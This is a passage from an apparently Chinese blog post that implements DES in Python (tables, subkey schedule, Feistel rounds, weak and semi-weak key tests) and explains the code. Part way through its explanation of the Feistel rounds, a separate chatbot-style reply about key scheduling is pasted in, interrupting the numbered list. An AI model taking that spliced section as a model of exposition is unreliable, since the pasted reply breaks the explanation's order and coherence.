class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 初始置换 IP 表（64位 -&gt; 64位）</span><br><span class="line">IP = [</span><br><span class="line">    58, 50, 42, 34, 26, 18, 10, 2,</span><br><span class="line">    60, 52, 44, 36, 28, 20, 12, 4,</span><br><span class="line">    62, 54, 46, 38, 30, 22, 14, 6,</span><br><span class="line">    64, 56, 48, 40, 32, 24, 16, 8,</span><br><span class="line">    57, 49, 41, 33, 25, 17, 9, 1,</span><br><span class="line">    59, 51, 43, 35, 27, 19, 11, 3,</span><br><span class="line">    61, 53, 45, 37, 29, 21, 13, 5,</span><br><span class="line">    63, 55, 47, 39, 31, 23, 15, 7</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># 逆初始置换 IP^-1 表（64位 -&gt; 64位）</span><br><span class="line">IP_INV = [</span><br><span class="line">    40, 8, 48, 16, 56, 24, 64, 32,</span><br><span class="line">    39, 7, 47, 15, 55, 23, 63, 31,</span><br><span class="line">    38, 6, 46, 14, 54, 22, 62, 30,</span><br><span class="line">    37, 5, 45, 13, 53, 21, 61, 29,</span><br><span class="line">    36, 4, 44, 12, 52, 20, 60, 28,</span><br><span class="line">    35, 3, 43, 11, 51, 19, 59, 27,</span><br><span class="line">    34, 2, 42, 10, 50, 18, 58, 26,</span><br><span class="line">    33, 1, 41, 9, 49, 17, 57, 25</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># 密钥置换 PC-1 表（64位 -&gt; 56位）</span><br><span class="line">PC1 = [</span><br><span class="line">    57, 49, 41, 33, 25, 17, 9,</span><br><span class="line">    1, 58, 50, 42, 34, 26, 18,</span><br><span class="line">    10, 2, 59, 51, 43, 35, 27,</span><br><span class="line">    19, 11, 3, 60, 52, 44, 36,</span><br><span class="line">    63, 55, 47, 39, 31, 23, 15,</span><br><span class="line">    7, 62, 54, 46, 38, 30, 22,</span><br><span class="line">    14, 6, 61, 53, 45, 37, 29,</span><br><span class="line">    21, 13, 5, 28, 20, 12, 4</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># 密钥置换 PC-2 表（56位 -&gt; 48位）</span><br><span class="line">PC2 = [</span><br><span class="line">    14, 17, 11, 24, 1, 5,</span><br><span class="line">    3, 28, 15, 6, 21, 10,</span><br><span class="line">    23, 19, 12, 4, 26, 8,</span><br><span class="line">    16, 7, 27, 20, 13, 2,</span><br><span class="line">    41, 52, 31, 37, 47, 55,</span><br><span class="line">    30, 40, 51, 45, 33, 48,</span><br><span class="line">    44, 49, 39, 56, 34, 53,</span><br><span class="line">    46, 42, 50, 36, 29, 32</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># 每轮循环左移位数表（16轮）</span><br><span class="line">SHIFT = [1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1]</span><br><span class="line"></span><br><span class="line"># 扩展置换 E 表（32位 -&gt; 48位）</span><br><span class="line">E = [</span><br><span class="line">    32, 1, 2, 3, 4, 5,</span><br><span class="line">    4, 5, 6, 7, 8, 9,</span><br><span class="line">    8, 9, 10, 11, 12, 13,</span><br><span class="line">    12, 13, 14, 15, 16, 17,</span><br><span class="line">    16, 17, 18, 19, 20, 21,</span><br><span class="line">    20, 21, 22, 23, 24, 25,</span><br><span class="line">    24, 25, 26, 27, 28, 29,</span><br><span class="line">    28, 29, 30, 31, 32, 1</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># S 盒定义（8个4x16的盒）</span><br><span class="line">S_BOX = [</span><br><span class="line">    # S1</span><br><span class="line">    [</span><br><span class="line">        [14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7],</span><br><span class="line">        [0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8],</span><br><span class="line">        [4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0],</span><br><span class="line">        [15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13]</span><br><span class="line">    ],</span><br><span class="line">    # S2</span><br><span class="line">    [</span><br><span class="line">        [15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10],</span><br><span class="line">        [3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5],</span><br><span class="line">        [0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15],</span><br><span class="line">        [13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9]</span><br><span class="line">    ],</span><br><span class="line">    # S3</span><br><span class="line">    [</span><br><span class="line">        [10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8],</span><br><span class="line">        [13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1],</span><br><span class="line">        [13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7],</span><br><span class="line">        [1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12]</span><br><span class="line">    ],</span><br><span class="line">    # S4</span><br><span class="line">    [</span><br><span class="line">        [7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15],</span><br><span class="line">        [13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9],</span><br><span class="line">        [10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4],</span><br><span class="line">        [3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14]</span><br><span class="line">    ],</span><br><span class="line">    # S5</span><br><span class="line">    [</span><br><span class="line">        [2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9],</span><br><span class="line">        [14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6],</span><br><span class="line">        [4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14],</span><br><span class="line">        [11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3]</span><br><span class="line">    ],</span><br><span class="line">    # S6</span><br><span class="line">    [</span><br><span class="line">        [12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11],</span><br><span class="line">        [10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8],</span><br><span class="line">        [9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6],</span><br><span class="line">        [4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13]</span><br><span class="line">    ],</span><br><span class="line">    # S7</span><br><span class="line">    [</span><br><span class="line">        [4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1],</span><br><span class="line">        [13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6],</span><br><span class="line">        [1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2],</span><br><span class="line">        [6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12]</span><br><span class="line">    ],</span><br><span class="line">    # S8</span><br><span class="line">    [</span><br><span class="line">        [13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7],</span><br><span class="line">        [1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2],</span><br><span class="line">        [7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8],</span><br><span class="line">        [2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11]</span><br><span class="line">    ]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># P 盒置换表（32位 -&gt; 32位）</span><br><span class="line">P = [</span><br><span class="line">    16, 7, 20, 21, 29, 12, 28, 17,</span><br><span class="line">    1, 15, 23, 26, 5, 18, 31, 10,</span><br><span class="line">    2, 8, 24, 14, 32, 27, 3, 9,</span><br><span class="line">    19, 13, 30, 6, 22, 11, 4, 25</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------- 工具函数 ----------------------</span><br><span class="line"></span><br><span class="line">def text_to_bin(text, length=64):</span><br><span class="line">    &quot;&quot;&quot;将文本或十六进制字符串转换为二进制字符串&quot;&quot;&quot;</span><br><span class="line">    if all(c in &#x27;0123456789ABCDEFabcdef&#x27; for c in text):</span><br><span class="line">        # 处理十六进制输入</span><br><span class="line">        binary = bin(int(text, 16))[2:].zfill(length)</span><br><span class="line">    else:</span><br><span class="line">        # 处理ASCII输入（实验测试中暂未使用）</span><br><span class="line">        binary = &#x27;&#x27;.join([bin(ord(c))[2:].zfill(8) for c in text])</span><br><span class="line">    return binary.zfill(length)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def bin_to_hex(binary):</span><br><span class="line">    &quot;&quot;&quot;二进制字符串转十六进制&quot;&quot;&quot;</span><br><span class="line">    return hex(int(binary, 2))[2:].upper().zfill(16)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def permute(bits, table):</span><br><span class="line">    &quot;&quot;&quot;根据置换表进行位置换&quot;&quot;&quot;</span><br><span class="line">    # 注意：DES置换表索引从1开始，Python列表从0开始，故需减1</span><br><span class="line">    return &#x27;&#x27;.join([bits[i - 1] for i in table])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def left_shift(bits, n):</span><br><span class="line">    &quot;&quot;&quot;循环左移n位&quot;&quot;&quot;</span><br><span class="line">    return bits[n:] + bits[:n]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def xor(a, b):</span><br><span class="line">    &quot;&quot;&quot;异或操作&quot;&quot;&quot;</span><br><span class="line">    return &#x27;&#x27;.join(str(int(x) ^ int(y)) for x, y in zip(a, b))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------- 子密钥生成 ----------------------</span><br><span class="line"></span><br><span class="line">def generate_subkeys(key):</span><br><span class="line">    &quot;&quot;&quot;生成16轮子密钥（48位）&quot;&quot;&quot;</span><br><span class="line">    # 初始置换 PC-1（64位 -&gt; 56位）</span><br><span class="line">    key = permute(key, PC1)</span><br><span class="line">    # 分割左右28位</span><br><span class="line">    left, right = key[:28], key[28:]</span><br><span class="line">    subkeys = []</span><br><span class="line">    for i in range(16):</span><br><span class="line">        # 根据SHIFT表循环左移</span><br><span class="line">        left = left_shift(left, SHIFT[i])</span><br><span class="line">        right = left_shift(right, SHIFT[i])</span><br><span class="line">        # 合并后置换 PC-2（56位 -&gt; 48位）</span><br><span class="line">        combined = left + right</span><br><span class="line">        subkey = permute(combined, PC2)</span><br><span class="line">        subkeys.append(subkey)</span><br><span class="line">    return subkeys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def feistel(right, subkey):</span><br><span class="line">    &quot;&quot;&quot;Feistel 函数（处理右半部分）&quot;&quot;&quot;</span><br><span class="line">    # 扩展置换 E（32位 -&gt; 48位）</span><br><span class="line">    expanded = permute(right, E)</span><br><span class="line">    # 与子密钥异或</span><br><span class="line">    xored = xor(expanded, subkey)</span><br><span class="line">    # S 盒替换（48位 -&gt; 32位）</span><br><span class="line">    s_output = &#x27;&#x27;</span><br><span class="line">    for i in range(8):</span><br><span class="line">        # 提取6位输入</span><br><span class="line">        chunk = xored[i * 6:(i + 1) * 6]</span><br><span class="line">        # 计算行和列（行由首尾两位决定，列由中间4位决定）</span><br><span class="line">        row = int(chunk[0] + chunk[5], 2)</span><br><span class="line">        col = int(chunk[1:5], 2)</span><br><span class="line">        # 查S盒并转换为4位二进制</span><br><span class="line">        val = S_BOX[i][row][col]</span><br><span class="line">        s_output += bin(val)[2:].zfill(4)</span><br><span class="line">    # P 盒置换</span><br><span class="line">    p_output = permute(s_output, P)</span><br><span class="line">    return p_output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------- DES 主函数 ----------------------</span><br><span class="line"></span><br><span class="line">def des(block, key, encrypt=True):</span><br><span class="line">    &quot;&quot;&quot;DES 加密/解密单块（64位）&quot;&quot;&quot;</span><br><span class="line">    # 生成子密钥</span><br><span class="line">    subkeys = generate_subkeys(key)</span><br><span class="line">    if not encrypt:</span><br><span class="line">        subkeys = subkeys[::-1]  # 解密时逆序使用子密钥</span><br><span class="line"></span><br><span class="line">    # 初始置换 IP</span><br><span class="line">    block = permute(block, IP)</span><br><span class="line">    # 分割左右32位</span><br><span class="line">    left, right = block[:32], block[32:]</span><br><span class="line"></span><br><span class="line">    # 16轮 Feistel 网络</span><br><span class="line">    for i in range(16):</span><br><span class="line">        new_left = right</span><br><span class="line">        # Feistel 函数处理右半部分</span><br><span class="line">        f_result = feistel(right, subkeys[i])</span><br><span class="line">        # 新右半部分 = 左半部分 XOR Feistel结果</span><br><span class="line">        new_right = xor(left, f_result)</span><br><span class="line">        left, right = new_left, new_right</span><br><span class="line"></span><br><span class="line">    # 最终合并并逆置换 IP^-1</span><br><span class="line">    combined = right + left  # 注意最后不交换</span><br><span class="line">    ciphertext = permute(combined, IP_INV)</span><br><span class="line">    return ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------- 测试代码 ----------------------</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    # 测试用例1：弱密钥</span><br><span class="line">    plaintext = &#x27;aaabbaba&#x27;</span><br><span class="line">    key = &#x27;0101010101010101&#x27;</span><br><span class="line">    # 转换为二进制</span><br><span class="line">    bin_plain = text_to_bin(plaintext)</span><br><span class="line">    bin_key = text_to_bin(key)</span><br><span class="line">    # 加密</span><br><span class="line">    cipher_bin = des(bin_plain, bin_key, encrypt=True)</span><br><span class="line">    cipher_hex = bin_to_hex(cipher_bin)</span><br><span class="line"></span><br><span class="line">    print(f&#x27;加密结果: &#123;cipher_hex&#125;&#x27;)</span><br><span class="line">    # 解密</span><br><span class="line">    decrypted_bin = des(cipher_bin, bin_key, encrypt=False)</span><br><span class="line">    decrypted_hex = bin_to_hex(decrypted_bin)</span><br><span class="line">    print(f&#x27;解密结果: &#123;decrypted_hex&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">    #二次加密</span><br><span class="line">    cipher_bin2 = des(cipher_bin, bin_key, encrypt=True)</span><br><span class="line">    bin_to_hex2 = bin_to_hex(cipher_bin2)</span><br><span class="line">    print(f&quot;二次加密: &#123;bin_to_hex2&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    # 半弱密钥</span><br><span class="line">    print()</span><br><span class="line">    print(&quot;半弱密钥&quot;)</span><br><span class="line">    plaintext = &#x27;aaabbaba&#x27;</span><br><span class="line">    key1 = &#x27;011f011f010e010e&#x27;</span><br><span class="line">    key2 = &#x27;1f011f010e010e01&#x27;</span><br><span class="line">    # 转换为二进制</span><br><span class="line">    bin_plain = text_to_bin(plaintext)</span><br><span class="line">    bin_key1 = text_to_bin(key1)</span><br><span class="line">    bin_key2 = text_to_bin(key2)</span><br><span class="line">    # 加密</span><br><span class="line">    cipher_bin = des(bin_plain, bin_key1, encrypt=True)</span><br><span class="line">    cipher_hex = bin_to_hex(cipher_bin)</span><br><span class="line"></span><br><span class="line">    print(f&#x27;一次加密结果: &#123;cipher_hex&#125;&#x27;)</span><br><span class="line">    # 解密</span><br><span class="line">    decrypted_bin = des(cipher_bin, bin_key1, encrypt=False)</span><br><span class="line">    decrypted_hex = bin_to_hex(decrypted_bin)</span><br><span class="line">    print(f&#x27;解密结果: &#123;decrypted_hex&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">    #二次加密</span><br><span class="line">    cipher_bin2 = des(cipher_bin, bin_key2, encrypt=True)</span><br><span class="line">    bin_to_hex2 = bin_to_hex(cipher_bin2)</span><br><span class="line">    print(f&quot;对称密钥二次加密: &#123;bin_to_hex2&#125;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以下是关于DES加密算法及其代码实现的详细解析：</p><p>一、DES算法流程解析</p><ol><li><p>初始置换（IP置换）<br>输入：64位明文<br>处理：根据IP表进行位置置换（原第58位成为新第1位，第50位成为新第2位…）<br>输出：置换后的64位数据分为L₀（前32位）和R₀（后32位）</p></li><li><p>16轮Feistel结构<br>每轮处理流程：<br>好问题！DES（数据加密标准）最核心的一步之一就是子密钥的生成，也叫<strong>密钥调度（Key Schedule）</strong>。我们一步步来讲，保证你这个密码小白也能听懂😎</p></li></ol><hr><h2 id="🧩-一、子密钥是啥？有什么用？"><a href="#🧩-一、子密钥是啥？有什么用？" class="headerlink" title="🧩 一、子密钥是啥？有什么用？"></a>🧩 一、子密钥是啥？有什么用？</h2><ul><li>DES 是一个 <strong>对称加密算法</strong>，用了 16 轮 Feistel 结构。</li><li>每一轮都要用一个 <strong>不同的子密钥</strong>（共 16 个子密钥）。</li><li><strong>主密钥是 64 位（但只用其中的 56 位）</strong>，从它生成 <strong>16 个 48 位的子密钥</strong>。</li><li>每轮加密/解密时，都从这 16 个子密钥中取对应的一个用。</li></ul><blockquote><p>✅ <strong>子密钥的作用：</strong><br>每轮加密都要和子密钥做异或、S盒替换等操作，不同子密钥让每轮加密都不同，增强了安全性。</p></blockquote><hr><h2 id="🔑-二、怎么从主密钥生成子密钥？"><a href="#🔑-二、怎么从主密钥生成子密钥？" class="headerlink" title="🔑 二、怎么从主密钥生成子密钥？"></a>🔑 二、怎么从主密钥生成子密钥？</h2><h3 id="Step-1️⃣：64位主密钥-→-56位有效密钥（去除奇偶校验位）"><a href="#Step-1️⃣：64位主密钥-→-56位有效密钥（去除奇偶校验位）" class="headerlink" title="Step 1️⃣：64位主密钥 → 56位有效密钥（去除奇偶校验位）"></a>Step 1️⃣：64位主密钥 → 56位有效密钥（去除奇偶校验位）</h3><p>主密钥长这样（64 位）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">K = k1 k2 k3 ... k64</span><br></pre></td></tr></table></figure><p>每 8 位中第 8 位是奇偶校验位（也就是说每 8 位只用前 7 位），所以有效密钥是 56 位。</p><p>这一步用的是一个固定的 <strong>PC-1（Permuted Choice 1）置换表</strong>，对密钥进行置换和选择，去掉了校验位。</p><hr><h3 id="Step-2️⃣：将-56-位密钥分成两半"><a href="#Step-2️⃣：将-56-位密钥分成两半" class="headerlink" title="Step 2️⃣：将 56 位密钥分成两半"></a>Step 2️⃣：将 56 位密钥分成两半</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C0 = 前 28 位</span><br><span class="line">D0 = 后 28 位</span><br></pre></td></tr></table></figure><hr><h3 id="Step-3️⃣：循环左移-PC-2-生成-16-个子密钥"><a href="#Step-3️⃣：循环左移-PC-2-生成-16-个子密钥" class="headerlink" title="Step 3️⃣：循环左移 + PC-2 生成 16 个子密钥"></a>Step 3️⃣：循环左移 + PC-2 生成 16 个子密钥</h3><p>从 C0 和 D0 开始，每一轮做 <strong>左移（1 位或 2 位，按轮数）</strong>：</p><div class="table-container"><table><thead><tr><th>轮数</th><th>移位次数</th></tr></thead><tbody><tr><td>1, 2, 9, 16</td><td>1 位</td></tr><tr><td>其他轮</td><td>2 位</td></tr></tbody></table></div><p>每轮都得到了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C1, D1 → K1  </span><br><span class="line">C2, D2 → K2  </span><br><span class="line">...  </span><br><span class="line">C16, D16 → K16  </span><br></pre></td></tr></table></figure><p>每次将 Cn 和 Dn 合并成 56 位，然后再用一个固定的 <strong>PC-2 表（Permuted Choice 2）</strong> 提取其中的 48 位生成 <strong>子密钥 Kn</strong>。</p><hr><h3 id="✏️-小结"><a href="#✏️-小结" class="headerlink" title="✏️ 小结"></a>✏️ 小结</h3><div class="table-container"><table><thead><tr><th>步骤</th><th>内容</th></tr></thead><tbody><tr><td>PC-1</td><td>把 64 位主密钥变成 56 位（去奇偶位）</td></tr><tr><td>分割</td><td>56 位 → C0 和 D0，各 28 位</td></tr><tr><td>左移</td><td>每轮对 C 和 D 循环左移 1 或 2 位</td></tr><tr><td>PC-2</td><td>从 CnDn 中选出 48 位 → 生成第 n 轮子密钥</td></tr></tbody></table></div><hr><h2 id="🛠-子密钥在加密中的使用"><a href="#🛠-子密钥在加密中的使用" class="headerlink" title="🛠 子密钥在加密中的使用"></a>🛠 子密钥在加密中的使用</h2><p>在 DES 的每一轮加密中：</p><ol><li>将明文左右分成 L 和 R。</li><li>用右边部分和当前轮的 <strong>子密钥</strong> 做复杂函数 <code>f(R, K_i)</code>，包括：<ul><li>扩展置换</li><li>和子密钥异或</li><li>S盒替换</li><li>P盒置换</li></ul></li><li>结果再和左边部分异或</li><li>左右换位进入下一轮</li></ol><hr><h2 id="🚀-总结一句话："><a href="#🚀-总结一句话：" class="headerlink" title="🚀 总结一句话："></a>🚀 总结一句话：</h2><blockquote><p><strong>子密钥是从主密钥中衍生出来的一组 48 位密钥，用于 DES 的每一轮加密。它通过置换、分割、循环移位、再次置换来生成，确保每一轮操作不同，增强安全性。</strong></p></blockquote><hr><p>如果你想，我可以给你画一张 <strong>子密钥生成流程图</strong>，或者写一段 Python 实现 DES 密钥调度的代码～需要吗？<br>(1) 右半部分Rₙ进行扩展置换E（32→48位）<br>(2) 与子密钥Kₙ进行异或运算<br>(3) 通过8个S盒进行非线性变换（48→32位）<br>(4) 进行P盒置换<br>(5) 结果与左半部分Lₙ异或生成新右半部分Rₙ₊₁<br>(6) 交换左右部分</p><ol><li>逆初始置换（IP⁻¹置换）<br>输入：最终合并的R₁₆L₁₆（注意不交换）<br>处理：根据IP_INV表进行置换<br>输出：64位密文</li></ol><p>二、代码模块解析</p><ol><li>置换表定义<br>代码中定义了DES算法所需的所有置换表：</li></ol><ul><li>IP/IP_INV：初始/逆初始置换</li><li>PC1/PC2：密钥置换表</li><li>E：扩展置换表</li><li>S_BOX：非线性替换盒</li><li>P：P盒置换表</li><li>SHIFT：循环左移位数表</li></ul><ol><li>核心函数说明<br>（1）permute(bits, table)<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">permute</span>(<span class="params">bits, table</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([bits[i - <span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> table])</span><br></pre></td></tr></table></figure>功能：通用置换函数<br>特点：处理所有DES置换操作，自动处理索引偏移（表格定义从1开始，Python索引从0开始）</li></ol><p>（2）generate_subkeys(key)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_subkeys</span>(<span class="params">key</span>):</span><br><span class="line">    key = permute(key, PC1)  <span class="comment"># PC-1置换</span></span><br><span class="line">    left, right = key[:<span class="number">28</span>], key[<span class="number">28</span>:]  <span class="comment"># 分割</span></span><br><span class="line">    subkeys = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        left = left_shift(left, SHIFT[i])  <span class="comment"># 循环左移</span></span><br><span class="line">        right = left_shift(right, SHIFT[i])</span><br><span class="line">        combined = left + right</span><br><span class="line">        subkey = permute(combined, PC2)  <span class="comment"># PC-2置换</span></span><br><span class="line">        subkeys.append(subkey)</span><br><span class="line">    <span class="keyword">return</span> subkeys</span><br></pre></td></tr></table></figure><br>功能：生成16轮子密钥<br>流程：</p><ol><li>64位密钥→PC1置换→56位</li><li>分割为左右28位</li><li>根据SHIFT表进行循环左移</li><li>合并后通过PC2置换生成48位子密钥</li></ol><p>（3）feistel(right, subkey)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">feistel</span>(<span class="params">right, subkey</span>):</span><br><span class="line">    expanded = permute(right, E)  <span class="comment"># 扩展置换</span></span><br><span class="line">    xored = xor(expanded, subkey)  <span class="comment"># 异或运算</span></span><br><span class="line">    s_output = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):  <span class="comment"># S盒处理</span></span><br><span class="line">        chunk = xored[i*<span class="number">6</span>:(i+<span class="number">1</span>)*<span class="number">6</span>]</span><br><span class="line">        row = <span class="built_in">int</span>(chunk[<span class="number">0</span>]+chunk[<span class="number">5</span>], <span class="number">2</span>)  <span class="comment"># 行号</span></span><br><span class="line">        col = <span class="built_in">int</span>(chunk[<span class="number">1</span>:<span class="number">5</span>], <span class="number">2</span>)         <span class="comment"># 列号</span></span><br><span class="line">        val = S_BOX[i][row][col]</span><br><span class="line">        